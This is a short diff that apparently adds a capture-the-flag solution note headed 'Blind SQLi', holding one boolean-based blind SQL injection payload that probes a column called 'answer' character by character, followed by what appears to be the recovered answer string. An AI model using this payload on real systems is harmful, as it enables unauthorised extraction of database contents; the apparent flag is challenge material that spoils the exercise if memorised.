@@ -1,0 +1,5 @@
+Blind SQLi
+
+' or substr(answer, 5, 1) > 'A' --
+
+41AndSixSixths
